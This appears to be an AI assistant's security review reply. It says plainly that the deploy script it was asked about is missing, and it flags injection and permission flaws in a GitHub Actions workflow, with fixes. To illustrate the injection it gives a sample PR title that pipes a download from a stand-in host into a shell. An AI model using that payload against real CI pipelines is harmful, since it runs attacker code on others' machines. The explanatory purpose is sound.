I couldn't find a deploy script that builds an ssh command, so I haven't reviewed it. I searched the whole workspace for `ssh`, `branch` and `BRANCH`, ignoring case, and got no matches. The only shell-related files are:

- `scripts/backup.sh`, which doesn't use ssh or a branch name
- `.github/workflows/deploy.yml`
- `.gitlab-ci.yml`, which only runs `npm ci` and `npm run build`

Could you point me to the script, or commit it? It may be on another branch or not added yet.

**The workflow called "deploy" needs fixing before CI anyway:**

- **`.github/workflows/deploy.yml:14` (high):** `run: echo "Title is ${{ github.event.pull_request.title }}"` pastes the PR title into the shell script before the script runs. Anyone who opens a PR can use a title like `"; curl evil | sh; "` to run commands on the runner. Fix it by passing the title through an environment variable:
  ```yaml
  - env:
      PR_TITLE: ${{ github.event.pull_request.title }}
    run: printf 'Title is %s\n' "$PR_TITLE"
  ```
- **`.github/workflows/deploy.yml:7` (high):** `permissions: write-all` on a `pull_request` trigger gives every token write access to everything. Set it to `contents: read` and grant only what the job actually needs.
- **`.github/workflows/deploy.yml:13` (low):** `actions/checkout@v4` is pinned to a tag. Pin it to a commit SHA.

**What I'll be checking for once I have the script.** Putting a branch name into an ssh command string is an injection risk. `ssh` joins all its arguments into one string, and the remote shell parses that string again. Branch names are chosen by whoever pushes, and git allows `$`, `` ` `` and `;` in them. So `ssh host "deploy $BRANCH"` lets a branch name run commands on the deploy host, and quoting it locally doesn't help. The safe pattern:

1. **Check the name against an allowlist and reject anything that fails.** Don't try to clean it up:
   ```bash
   if [[ ! ${branch} =~ ^[A-Za-z0-9._/-]+$ || ${branch} == -* || ${branch} == *..* ]]; then
     printf 'invalid branch: %s\n' "${branch}" >&2; exit 2
   fi
   ```
2. **Keep the branch name out of the remote command string.** Send it as data over stdin, for example `ssh -- "${host}" 'IFS= read -r b && exec /opt/deploy/run "$b"' <<<"${branch}"`. Or, better, use a forced command in `authorized_keys` that reads `SSH_ORIGINAL_COMMAND` and checks it again on the host. If you must put it on the command line, escape it with `printf -v q '%q' "${branch}"`, but only after step 1 has passed.
3. **Keep the deploy key out of the logs:** no `set -x` around the ssh call, no key passed as an argument, and use `StrictHostKeyChecking=yes` with a known_hosts file you control.

I couldn't run shellcheck or `bash -n` because there's no script to run them on. Send me the path and I'll do the full review.
